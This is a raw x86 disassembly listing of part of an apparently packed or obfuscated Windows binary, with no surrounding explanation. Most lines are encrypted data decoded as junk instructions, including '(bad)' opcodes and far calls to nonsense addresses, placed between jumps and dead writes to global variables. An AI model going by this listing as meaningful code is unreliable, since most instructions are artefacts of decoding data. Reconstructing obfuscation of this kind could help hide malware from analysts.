  40daf8:	mov    edi,0x317e1c1e
  40dafd:	pop    es
  40dafe:	int    0x3e
  40db00:	dec    esp
  40db01:	xlat   BYTE PTR ds:[ebx]
  40db02:	mov    esp,DWORD PTR [edx-0x3810e6ae]
  40db08:	pop    ss
  40db09:	sbb    BYTE PTR [edx-0x794d2b6e],0x4f
  40db10:	jno    0x40dacc
  40db12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db13:	stos   DWORD PTR es:[edi],eax
  40db14:	test   BYTE PTR [edi-0x5b],dl
  40db17:	call   0x63a6:0x4f68666a
  40db1e:	call   0xc31b474a
  40db23:	jle    0x40dabc
  40db25:	es aam 0x56
  40db28:	mov    al,0xb7
  40db2a:	jbe    0x40db6e
  40db2c:	sub    DWORD PTR [edi-0x681a4d5d],0x3e
  40db33:	mov    al,0x12
  40db35:	or     ch,ch
  40db37:	imul   eax,DWORD PTR [ecx+0x4a],0x6931c67
  40db3e:	das    
  40db3f:	icebp  
  40db40:	aaa    
  40db41:	cli    
  40db42:	ins    DWORD PTR es:[edi],dx
  40db43:	and    al,0xe3
  40db45:	jecxz  0x40db35
  40db47:	jo     0x40db93
  40db49:	iret   
  40db4a:	mov    ch,0x9f
  40db4c:	mov    dl,0x18
  40db4e:	enter  0xed31,0xc8
  40db52:	imul   eax,ebx,0x79797ba4
  40db58:	cmc    
  40db59:	mov    ebx,0x6f9e5161
  40db5e:	mov    bl,0xc5
  40db60:	xor    al,0x3f
  40db62:	mov    dh,0x61
  40db64:	and    ebx,DWORD PTR [ecx-0x2c006944]
  40db6a:	retf   
  40db6b:	and    eax,0x425faa9c
  40db70:	xchg   esi,eax
  40db71:	lahf   
  40db72:	ss lahf 
  40db74:	xchg   esi,eax
  40db75:	mov    ecx,0x71b3fbc7
  40db7a:	mov    edx,0x36bfdeb6
  40db7f:	add    DWORD PTR [esi-0x4b],0x798601de
  40db86:	repnz pop ebx
  40db88:	dec    esi
  40db89:	push   edi
  40db8a:	shr    BYTE PTR [ebx+ebp*4],cl
  40db8d:	or     DWORD PTR [eax-0xf],esp
  40db90:	xchg   esp,eax
  40db91:	push   edi
  40db92:	inc    ebp
  40db93:	and    BYTE PTR [eax],cl
  40db95:	in     eax,0xa3
  40db97:	mov    esp,0x2ab0478
  40db9c:	shl    eax,0x33
  40db9f:	js     0x40db2b
  40dba1:	sub    ch,bh
  40dba3:	out    0xbb,al
  40dba5:	sbb    DWORD PTR [edi+0x55],0x99f2d596
  40dbac:	or     eax,0x31616e04
  40dbb1:	cs or  eax,0xc13b8f04
  40dbb7:	jne    0x40de3d
  40dbbd:	mov    eax,DWORD PTR [ebp-0x4]
  40dbc0:	xor    eax,edi
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi-0x3fbfeba4],0xfabfba9a
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dba3
  40dbe0:	lods   al,BYTE PTR ds:[esi]
  40dbe1:	repz and eax,0x40ff5703
  40dbe7:	or     ebx,esi
  40dbe9:	shl    DWORD PTR [edi-0x3],1
  40dbec:	lahf   
  40dbed:	inc    edi
  40dbee:	loopne 0x40dc40
  40dbf0:	int    0x35
  40dbf2:	shl    edi,0x63
  40dbf5:	jmp    0x3f8ea3c6
  40dbfa:	es dec ebp
  40dbfc:	mov    ss,WORD PTR ds:0xff656910
  40dc02:	cli    
  40dc03:	aam    0xac
  40dc05:	test   dl,cl
  40dc07:	push   0x81c76ef4
  40dc0c:	jne    0x40dc5a
  40dc0e:	push   esi
  40dc0f:	sti    
  40dc10:	stos   DWORD PTR es:[edi],eax
  40dc11:	add    DWORD PTR [ecx],esi
  40dc13:	pop    ecx
  40dc14:	retf   
  40dc15:	jno    0x40dbae
  40dc17:	mov    ah,ch
  40dc19:	dec    ebp
  40dc1a:	xchg   esi,eax
  40dc1b:	push   eax
  40dc1c:	add    DWORD PTR [edi-0x6b50e125],edx
  40dc22:	jmp    0x6f034b95
  40dc27:	mov    dh,0x95
  40dc29:	in     eax,0xb3
  40dc2b:	pushf  
  40dc2c:	push   eax
  40dc2d:	pop    ebx
  40dc2e:	aam    0x28
  40dc30:	add    eax,DWORD PTR [ebx+0x64902025]
  40dc36:	xor    DWORD PTR [ebx],esp
  40dc38:	mov    cl,0xd1
  40dc3a:	out    0x7c,eax
  40dc3c:	xor    ebp,edi
  40dc3e:	loop   0x40dc3c
  40dc40:	addr16 call 0x9d04:0xc2d65b92
  40dc48:	ret    0x328a
  40dc4b:	stc    
  40dc4c:	fwait
  40dc4d:	sbb    ebx,DWORD PTR cs:[ebx]
  40dc50:	sub    al,0xda
  40dc52:	dec    ecx
  40dc53:	mov    cl,0x19
  40dc55:	retf   
  40dc56:	or     ebp,esi
  40dc58:	and    edx,DWORD PTR [ecx+0x74b0f750]
  40dc5e:	jnp    0x40dc6a
  40dc60:	lods   eax,DWORD PTR ds:[esi]
  40dc61:	ficomp DWORD PTR [eax-0x5d]
  40dc64:	mov    BYTE PTR [eax],cl
  40dc66:	imul   ecx,esp,0xd
  40dc69:	pop    esp
  40dc6a:	cmc    
  40dc6b:	mul    esp
  40dc6d:	mov    ds:0x7c7b439b,eax
  40dc72:	fld    DWORD PTR [edx+0x33]
  40dc75:	or     eax,0x420882dd
  40dc7a:	adc    BYTE PTR [eax+0x78908c9],dl
  40dc80:	shl    BYTE PTR [ecx-0xb],1
  40dc83:	pop    es
  40dc84:	(bad)  
  40dc86:	shl    BYTE PTR [ecx],0xd0
  40dc89:	je     0x40dc4c
  40dc8b:	push   edx
  40dc8c:	dec    eax
  40dc8d:	imul   eax,DWORD PTR [eax-0x5d],0x30248e85
  40dc94:	out    0xb6,eax
  40dc96:	xor    DWORD PTR [esi+esi*2+0x2c5784b5],edx
  40dc9d:	inc    esi
  40dc9e:	push   cs
  40dc9f:	cmp    BYTE PTR [esi*8+0x77bb4d55],dl
  40dca6:	lea    esp,[ecx]
  40dca8:	bound  ecx,QWORD PTR [eax-0x1d162455]
  40dcae:	lods   eax,DWORD PTR ds:[esi]
  40dcaf:	pop    es
  40dcb0:	mov    esp,0xc018b485
  40dcb5:	nop
  40dcb6:	mov    esi,esp
  40dcb8:	test   al,0x2b
  40dcba:	js     0x40dd08
  40dcbc:	push   ebp
  40dcbd:	or     DWORD PTR [eiz*1+0x3137faf5],esi
  40dcc4:	lods   al,BYTE PTR ds:[esi]
  40dcc5:	add    eax,0x28bbe7cf
  40dcca:	cmp    edi,edx
  40dccc:	ins    DWORD PTR es:[edi],dx
  40dccd:	jae    0x40dcb2
  40dccf:	mov    esi,0xb3547cfc
  40dcd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd5:	add    esi,DWORD PTR [esi-0x31212a1b]
  40dcdb:	push   eax
  40dcdc:	push   esp
  40dcdd:	xchg   edi,eax
  40dcde:	fsubr  DWORD PTR [eax]
  40dce0:	rcr    BYTE PTR [ecx+esi*2-0x1b],0xd6
  40dce5:	mov    ah,0x28
  40dce7:	rcr    eax,0x32
  40dcea:	rcl    BYTE PTR [ebp-0x24321154],1
  40dcf0:	das    
  40dcf1:	mov    dl,0x8
  40dcf3:	inc    DWORD PTR [eax-0x53]
  40dcf6:	and    BYTE PTR [eax+0x1c],al
  40dcf9:	nop
  40dcfa:	sar    DWORD PTR [eax+edx*1+0x61d75e1],cl
  40dd01:	ja     0x40dd6f
  40dd03:	out    dx,al
  40dd04:	add    ch,BYTE PTR [ecx+0xb]
  40dd07:	jno    0x40dd08
  40dd09:	or     dl,BYTE PTR [eax-0x4138012e]
  40dd0f:	pushf  
  40dd10:	aad    0xd2
  40dd12:	jns    0x40dd18
  40dd14:	jle    0x40dd8b
  40dd16:	inc    esi
  40dd17:	push   ss
  40dd18:	pop    esp
  40dd19:	and    edx,DWORD PTR [esi+eiz*4+0x457c7b31]
  40dd20:	int    0xa6
  40dd22:	(bad)  
  40dd23:	loop   0x40dd8a
  40dd25:	ss sbb al,0xbd
  40dd28:	dec    ecx
  40dd29:	xchg   dl,cl
  40dd2b:	pusha  
  40dd2c:	push   ds
  40dd2d:	call   0x340e:0x6b24a786
  40dd34:	(bad)  [edx-0x2d]
  40dd37:	sbb    BYTE PTR [edi-0x7f],al
  40dd3a:	ins    BYTE PTR es:[edi],dx
  40dd3b:	jmp    FWORD PTR [edx]
  40dd3d:	xchg   edi,eax
  40dd3e:	add    DWORD PTR [esi-0x60aa98ba],esp
  40dd44:	mov    edx,0xa9bbea6b
  40dd49:	fsubrp st(7),st
  40dd4b:	adc    cl,ah
  40dd4d:	(bad)  
  40dd4f:	add    DWORD PTR [ebp+0x2b0dddae],edi
  40dd55:	enter  0x936d,0x21
  40dd59:	sub    DWORD PTR [ecx],ecx
  40dd5b:	pop    esp
  40dd5c:	inc    edi
  40dd5d:	sub    eax,DWORD PTR [edi-0x2475144a]
  40dd63:	shl    DWORD PTR [edx-0x78],cl
  40dd66:	inc    ebx
  40dd67:	push   esp
  40dd68:	and    al,BYTE PTR [edi]
  40dd6a:	ret    0x84e4
  40dd6d:	lea    edx,[esi-0x34822368]
  40dd73:	cmp    BYTE PTR [ecx+0x6cb2b430],0x72
  40dd7a:	lods   eax,DWORD PTR ds:[si]
  40dd7c:	xchg   ch,dl
  40dd7e:	out    0xd2,al
  40dd80:	iret   
  40dd81:	scas   eax,DWORD PTR es:[edi]
  40dd82:	dec    esi
  40dd83:	push   cs
  40dd84:	mov    ch,0x3b
  40dd86:	pop    ecx
  40dd87:	sub    cl,bl
  40dd89:	jmp    0xc2f17a1a
  40dd8e:	jno    0x40dde7
  40dd90:	or     eax,0xbad47177
  40dd95:	int3   
  40dd96:	mov    ch,0x71
  40dd98:	pop    es
  40dd99:	inc    esi
  40dd9a:	int3   
  40dd9b:	loope  0x40dd96
  40dd9d:	jg     0x40dd75
  40dd9f:	mov    ds:0xd385611,al
  40dda4:	lods   al,BYTE PTR ds:[esi]
  40dda5:	xlat   BYTE PTR ds:[ebx]
  40dda6:	repz add bh,BYTE PTR [edx]
  40dda9:	inc    esp
  40ddaa:	cmp    al,BYTE PTR [esi-0x3d84fd5f]
  40ddb0:	es retf 
  40ddb2:	pushf  
  40ddb3:	push   ds
  40ddb4:	jb     0x40ddb4
  40ddb6:	xchg   ecx,edx
  40ddb8:	fisubr DWORD PTR [ebx-0x3a]
  40ddbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddbc:	rcr    al,0xac
  40ddbf:	cwde   
  40ddc0:	sub    DWORD PTR [ecx-0x242c8eab],ecx
  40ddc6:	arpl   WORD PTR [ebx],bp
  40ddc8:	fwait
  40ddc9:	add    al,0x63
  40ddcb:	pop    ebx
  40ddcc:	(bad)  
  40ddce:	add    ebx,DWORD PTR [edi-0x78]
  40ddd1:	cmp    eax,0x365207aa
  40ddd6:	sbb    BYTE PTR [ecx+0x73],0x4c
  40ddda:	retf   0xdf35
  40dddd:	pop    esp
  40ddde:	in     eax,0xc5
  40dde0:	(bad)  
  40dde1:	xchg   edx,eax
  40dde2:	mov    esi,0x3ea744d3
  40dde7:	sub    BYTE PTR [esi],ch
  40dde9:	enter  0x445b,0x86
  40dded:	pop    es
  40ddee:	mov    cl,0xf4
  40ddf0:	daa    
  40ddf1:	adc    BYTE PTR [esi],cl
  40ddf3:	mov    esi,0x4fb50da9
  40ddf8:	in     eax,0xcd
  40ddfa:	mov    ebx,0x42d767ac
  40ddff:	in     eax,0x6e
  40de01:	push   cs
  40de02:	mov    ds:0x136afed5,al
  40de07:	aam    0x40
  40de09:	xor    eax,0xb49eaa64
  40de0e:	fisttp DWORD PTR [esp+ebx*2-0x70]
  40de12:	fs xchg ebx,eax
  40de14:	adc    al,0x20
  40de16:	lock ret 
  40de18:	push   esi
  40de19:	adc    bl,BYTE PTR [eax]
  40de1b:	sbb    eax,0x35c4654
  40de20:	(bad)  
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43379f,0x0
  40de5a:	mov    eax,ds:0x43379f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43379f,eax
  40de65:	cmp    DWORD PTR ds:0x43379f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43379f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x4337ef,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	test   DWORD PTR [edi],0xba7cebe1
  40deab:	pushf  
  40deac:	jle    0x40df2c
  40deae:	adc    bh,BYTE PTR [edi+0x7e]
  40deb1:	jle    0x40de61
  40deb3:	sbb    ch,BYTE PTR ds:0xa88a1711
  40deb9:	retf   
  40deba:	and    ecx,ebx
  40debc:	iret   
  40debd:	retf   
  40debe:	push   cs
  40debf:	adc    BYTE PTR [esi],bl
  40dec1:	bound  eax,QWORD PTR [esi]
  40dec3:	sti    
  40dec4:	sub    al,0x62
  40dec6:	inc    edi
  40dec7:	inc    esi
  40dec8:	gs fwait
  40deca:	test   DWORD PTR [edi-0x104bca8f],edx
  40ded0:	mov    es,esp
  40ded2:	push   ss
  40ded3:	stos   BYTE PTR es:[edi],al
  40ded4:	pop    esp
  40ded5:	sub    BYTE PTR [esi],al
  40ded7:	cmp    al,0x40
  40ded9:	sbb    al,0x56
  40dedb:	jmp    0x54e89d97
  40dee0:	jb     0x40deb6
  40dee2:	xlat   BYTE PTR ds:[ebx]
  40dee3:	xor    ebp,DWORD PTR [ebx+0x63]
  40dee6:	fidivr DWORD PTR [ebp-0x791d68cd]
  40deec:	popa   
  40deed:	inc    esp
  40deee:	cmp    eax,0x8581e7de
  40def3:	push   edx
  40def4:	mov    WORD PTR [esi-0x12f75b92],?
  40defa:	scas   al,BYTE PTR es:[edi]
  40defb:	jge    0x40deba
  40defd:	test   edx,esp
  40deff:	daa    
  40df00:	jmp    0x8b3a:0x6471c998
  40df07:	dec    edi
  40df08:	or     BYTE PTR [esi-0x295f8562],0x9d
  40df0f:	add    BYTE PTR [ebx+0x1d],dl
  40df12:	jle    0x40de9a
  40df14:	mov    dl,0x1b
  40df16:	adc    ecx,DWORD PTR [ebx+ebx*1]
  40df19:	jo     0x40df3a
  40df1b:	push   cs
  40df1c:	push   0x41a28e8f
  40df21:	add    ecx,DWORD PTR [ebx-0x20]
  40df24:	push   ss
  40df25:	daa    
  40df26:	scas   eax,DWORD PTR es:[edi]
  40df27:	jmp    DWORD PTR [eax+0x52]
  40df2a:	mov    ch,0x77
  40df2c:	les    ebx,FWORD PTR [eax]
  40df2e:	or     DWORD PTR [edx+0x4],eax
  40df31:	or     edx,DWORD PTR [ecx]
  40df33:	loope  0x40debe
  40df35:	inc    eax
  40df36:	mov    ecx,0x9c2f9391
  40df3b:	pop    ebx
  40df3c:	daa    
  40df3d:	outs   dx,DWORD PTR ds:[esi]
  40df3e:	pop    edx
  40df3f:	ins    DWORD PTR es:[edi],dx
  40df40:	xor    DWORD PTR [edi-0x3d],ecx
  40df43:	sbb    al,0x2d
  40df45:	retf   0x5f00
  40df48:	mov    esp,0xd2c732a
  40df4d:	loope  0x40df39
  40df4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df50:	or     BYTE PTR ds:0x4246ddeb,ah
  40df56:	(bad)  
  40df57:	jmp    0x71434628
  40df5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df5d:	adc    ebp,ecx
  40df5f:	in     eax,0xac
  40df61:	mov    esi,0xf5bcfa54
  40df66:	adc    eax,0x92f0c588
  40df6b:	add    BYTE PTR [edx+0x2f9466f1],ah
  40df71:	pop    ebx
  40df72:	fmul   DWORD PTR [edx+eiz*1-0x48]
  40df76:	sub    ch,BYTE PTR [ebp-0x6b9125fc]
  40df7c:	jmp    0xb9d6:0xb9cc9b5e
  40df83:	dec    edi
  40df84:	out    dx,eax
  40df85:	outs   dx,BYTE PTR ds:[esi]
  40df86:	shl    BYTE PTR [eax+0x2a1dae56],1
  40df8c:	adc    eax,0xc742adcf
  40df91:	xchg   esp,eax
  40df92:	ja     0x40df63
  40df94:	cdq    
  40df95:	add    al,0xef
  40df97:	int    0x45
  40df99:	add    DWORD PTR [ebp+0x5d5d172f],0x13
  40dfa0:	push   ebx
  40dfa1:	pop    esi
  40dfa2:	out    dx,al
  40dfa3:	cmp    eax,0xd46abb2b
  40dfa8:	idiv   BYTE PTR [edi]
  40dfaa:	clc    
  40dfab:	pop    es
  40dfac:	retf   0xd141
  40dfaf:	ds mov ecx,0xe0ae3060
  40dfb5:	mov    ah,0x22
  40dfb7:	jl     0x40df41
  40dfb9:	jl     0x40e01f
  40dfbb:	xchg   DWORD PTR [ebp-0xb],ebp
  40dfbe:	adc    DWORD PTR [edx+0x32aa6220],esi
  40dfc4:	icebp  
  40dfc5:	or     cl,BYTE PTR [ecx-0x20]
  40dfc8:	jne    0x40df7e
  40dfca:	mov    dl,0x5c
  40dfcc:	cmp    DWORD PTR [edi],edx
  40dfce:	mov    eax,DWORD PTR [ebp+0x8]
  40dfd1:	sub    DWORD PTR ds:0x433797,0x625
  40dfdb:	push   ebx
  40dfdc:	sub    DWORD PTR ds:0x4337eb,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	pop    ebp
  40e004:	lods   al,BYTE PTR ds:[esi]
  40e005:	fucomip st,st(2)
  40e007:	pop    esi
  40e008:	popf   
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40e076
  40e010:	imul   esi,DWORD PTR [ecx-0x410af8a3],0xd22ccc3b
  40e01a:	not    DWORD PTR [eax]
  40e01c:	xor    edx,DWORD PTR ds:0x830b0c51
  40e022:	les    edi,FWORD PTR ds:0xfb1fd913
  40e028:	(bad)  
  40e029:	mov    ds:0x166fd1e9,al
  40e02e:	int    0xf8
  40e030:	mov    edi,edi
  40e032:	dec    esp
  40e033:	xchg   ebx,eax
  40e034:	cld    
  40e035:	rcl    BYTE PTR [edi-0x7a],1
  40e038:	xor    bh,BYTE PTR [edi]
  40e03a:	call   0xd7a6df77
  40e03f:	xor    al,0xde
  40e041:	push   ss
  40e042:	sbb    esp,edx
  40e044:	jb     0x40e0b6
  40e046:	push   es
  40e047:	call   0xf7da9d17
  40e04c:	mov    ah,bl
  40e04e:	stc    
  40e04f:	or     eax,0x8c929015
  40e054:	and    al,0x2a
  40e056:	enter  0x3dd0,0xc9
  40e05a:	fs dec eax
  40e05c:	xchg   edi,eax
  40e05d:	xor    esp,DWORD PTR [edx+esi*4+0x30]
  40e061:	test   eax,0x6b6399a9
  40e066:	or     dh,BYTE PTR [eax-0x224282b3]
  40e06c:	sbb    DWORD PTR [eax+0x69],esp
  40e06f:	xchg   ecx,eax
  40e070:	jecxz  0x40e09b
  40e072:	call   0x535a31cc
  40e077:	pop    ecx
  40e078:	cmp    al,0x96
  40e07a:	dec    esi
  40e07b:	mov    dl,0x21
  40e07d:	enter  0x1566,0xbf
  40e081:	lea    ebx,[edi+0x35]
  40e084:	xchg   esi,eax
  40e085:	jle    0x40e070
  40e087:	adc    eax,esp
  40e089:	fdivr  DWORD PTR [edi]
  40e08b:	jge    0x40e0af
  40e08d:	push   cs
  40e08e:	sar    DWORD PTR fs:[edi],1
  40e091:	stc    
  40e092:	xor    eax,0xfcdc3889
  40e097:	mov    DWORD PTR [edx],ecx
  40e099:	xchg   ecx,eax
  40e09b:	mov    esi,0x40cd4b9f
  40e0a0:	retf   0x6e6f
  40e0a3:	popa   
  40e0a4:	cmc    
  40e0a5:	(bad)  
  40e0a6:	not    BYTE PTR [edx-0x5aced192]
  40e0ac:	mov    DWORD PTR [edi],edi
  40e0ae:	push   esp
  40e0af:	stc    
  40e0b0:	or     eax,0xe114c9b3
  40e0b5:	dec    esi
  40e0b6:	pop    di
  40e0b8:	std    
  40e0b9:	fwait
  40e0ba:	mov    ebp,0x7ac4429
  40e0bf:	or     DWORD PTR [eax],esp
  40e0c1:	test   DWORD PTR [edi-0x5fdda967],esi
  40e0c7:	jmp    0x27dea0c5
  40e0cc:	add    esi,DWORD PTR [esp+edx*2+0x7f4bbaa2]
  40e0d3:	stos   BYTE PTR es:[edi],al
  40e0d4:	pusha  
  40e0d5:	inc    edi
  40e0d6:	push   ss
  40e0d7:	aad    0x1
  40e0d9:	ins    BYTE PTR es:[edi],dx
  40e0da:	fsub   QWORD PTR [edx-0x1ad90bf8]
  40e0e0:	xor    al,0xdd
  40e0e2:	popf   
  40e0e3:	cmc    
  40e0e4:	out    0x71,al
  40e0e6:	or     BYTE PTR [edi],0x22
  40e0e9:	jno    0x40e0a3
  40e0eb:	iret   
  40e0ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0ed:	iret   
  40e0ee:	sub    bh,ch
  40e0f0:	out    0x3d,al
  40e0f2:	mov    edi,0xdd78d3fb
  40e0f7:	daa    
  40e0f8:	mov    ds,WORD PTR [ebx+eiz*4-0x36]
  40e0fc:	xchg   esi,eax
  40e0fd:	out    dx,al
  40e0fe:	dec    eax
  40e0ff:	mov    cs,WORD PTR [edx-0x13]
  40e102:	aaa    
  40e103:	mov    ecx,0x43eaf80b
  40e108:	test   eax,0x6b5323a1
  40e10d:	cmp    BYTE PTR [edi-0x59fd74f4],ch
  40e113:	dec    edx
  40e114:	aas    
  40e115:	shl    edx,0x93
  40e118:	and    dl,BYTE PTR [eax-0x53]
  40e11b:	out    dx,eax
  40e11c:	pusha  
  40e11d:	adc    eax,0xb2a5433f
  40e122:	aad    0x34
  40e124:	rcr    BYTE PTR [edx+0x114a49cf],cl
  40e12a:	push   edi
  40e12b:	xor    eax,esi
  40e12d:	adc    DWORD PTR ds:0x4337a3,0x2097
  40e137:	mov    ebx,0x32729b
  40e13c:	xor    DWORD PTR ds:0x4337ef,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	ins    BYTE PTR es:[edi],dx
  40e15b:	sbb    DWORD PTR [esi+ebx*8],ebp
  40e15e:	jb     0x40e0fa
  40e160:	jle    0x40e1e0
  40e162:	adc    bh,BYTE PTR [edi+0x7e]
  40e165:	jle    0x40e0e9
  40e167:	cdq    
  40e168:	and    DWORD PTR [edi-0x45],0x814abc79
  40e16f:	sbb    DWORD PTR [esi+ebx*4+0x73],0xffffffbe
  40e174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e175:	das    
  40e176:	mov    ?,WORD PTR [edi]
  40e178:	into   
  40e179:	cld    
  40e17a:	and    al,bh
  40e17c:	xchg   bh,dl
  40e17e:	pop    eax
  40e17f:	jmp    0x509238dc
  40e184:	add    ah,BYTE PTR [ebx-0x2c]
  40e187:	pop    edi
  40e188:	push   edi
  40e189:	jg     0x40e1dc
  40e18b:	mov    ds:0xb7052753,ax
  40e191:	mov    ch,0x23
  40e193:	dec    esp
  40e194:	out    dx,al
  40e195:	imul   esp,DWORD PTR [edx+0x54],0x1d
  40e199:	out    0x5c,eax
  40e19b:	bound  esi,QWORD PTR [esi+0x1de31f9c]
  40e1a1:	mov    al,BYTE PTR [ecx]
  40e1a3:	cmc    
  40e1a4:	lods   eax,DWORD PTR ds:[esi]
  40e1a5:	adc    bh,BYTE PTR [edi-0x39]
  40e1a8:	dec    ebp
  40e1aa:	push   ds
  40e1ab:	and    ch,BYTE PTR [edi]
  40e1ad:	mov    WORD PTR [esi+0x7d9fbf29],?
  40e1b3:	adc    DWORD PTR [ebx+0x6c],ebp
  40e1b6:	pop    edx
  40e1b7:	adc    ebp,DWORD PTR [edx]
  40e1b9:	fistp  QWORD PTR [edi+0x69]
  40e1bc:	or     ecx,esi
  40e1be:	cwde   
  40e1bf:	rol    DWORD PTR [edi-0x294959a4],1
  40e1c5:	aam    0xb6
  40e1c7:	adc    BYTE PTR [ebx-0x36],0x6
  40e1cb:	rcr    bh,cl
  40e1cd:	dec    edx
  40e1ce:	mov    edi,0x7774c952
  40e1d3:	pop    ebx
  40e1d4:	sub    cl,BYTE PTR [edi]
  40e1d6:	push   ebx
  40e1d7:	xchg   ebp,eax
  40e1d8:	call   0x6b9c:0xd1a75c89
  40e1df:	adc    al,0x5d
  40e1e1:	leave  
  40e1e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1e3:	lods   al,BYTE PTR ds:[esi]
  40e1e4:	xchg   ebx,eax
  40e1e5:	inc    ebp
  40e1e6:	mov    dh,0x23
  40e1e8:	rcl    ecx,0x5d
  40e1eb:	daa    
  40e1ec:	pop    ecx
  40e1ed:	cld    
  40e1ee:	cmp    al,0x6
  40e1f0:	mov    ecx,0x338d38d8
  40e1f5:	inc    ebp
  40e1f6:	(bad)  
  40e1f7:	jle    0x40e1eb
  40e1f9:	pop    edx
  40e1fa:	call   0x5b34:0x1f1d4cee
  40e201:	push   ebp
  40e202:	xor    edx,DWORD PTR [ecx+0x6bb20ca9]
  40e208:	xlat   BYTE PTR ds:[ebx]
  40e209:	xchg   edi,eax
  40e20a:	aas    
  40e20b:	and    cl,BYTE PTR ds:0xcb72acde
  40e211:	ds scas eax,DWORD PTR es:[edi]
  40e213:	cmp    BYTE PTR [eax],0xc1
  40e216:	dec    edx
  40e217:	frstor [ecx-0x59]
  40e21b:	push   ss
  40e21c:	inc    ecx
  40e21d:	add    eax,0xfba4b5bd
  40e222:	(bad)  
  40e223:	pop    ebp
  40e224:	fld    DWORD PTR [ecx]
  40e226:	(bad)  
  40e227:	jbe    0x40e1d7
  40e229:	es in  eax,dx
  40e22b:	jmp    FWORD PTR ds:0xfda4dad
  40e231:	push   edx
  40e232:	and    eax,0xcfe3f707
  40e237:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e238:	xchg   BYTE PTR [esi+0x27101f53],dh
  40e23e:	add    eax,0xa73064ff
  40e243:	test   al,0xcc
  40e245:	and    dl,bl
  40e247:	gs pop ds
  40e249:	push   ebp
  40e24a:	ret    
  40e24b:	shr    DWORD PTR [ecx],cl
  40e24d:	xor    dh,BYTE PTR [esi]
  40e24f:	ror    bl,1
  40e251:	cmp    al,0x26
  40e253:	add    ch,dh
  40e255:	xor    dh,BYTE PTR [esi+0xe]
  40e258:	inc    edx
  40e259:	inc    edx
  40e25a:	adc    al,0xd0
  40e25c:	jae    0x40e1e6
  40e25e:	or     eax,0xaf866dde
  40e263:	in     al,0xf3
  40e265:	mov    ebp,DWORD PTR [edx+ebp*4]
  40e268:	sbb    al,0x1b
  40e26a:	mov    DWORD PTR [eax],esi
  40e26c:	add    cl,BYTE PTR [ebp-0x16]
  40e26f:	add    BYTE PTR [edx-0xe],0x87
  40e273:	jb     0x40e28d
  40e275:	ss mov ah,0x5a
  40e278:	sti    
  40e279:	mov    edx,0x36819995
  40e27e:	cmp    al,0x29
  40e280:	in     al,0xb3
  40e282:	mov    DWORD PTR [ebp-0x18],eax
  40e285:	mov    edi,DWORD PTR [ebp+0x8]
  40e288:	inc    DWORD PTR ds:0x43370b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x4337e3,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x43382b
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433797,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43370b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x4337d7,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43379f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43371b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43381f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x43382b,0x7077
  40e315:	jmp    0x40e830
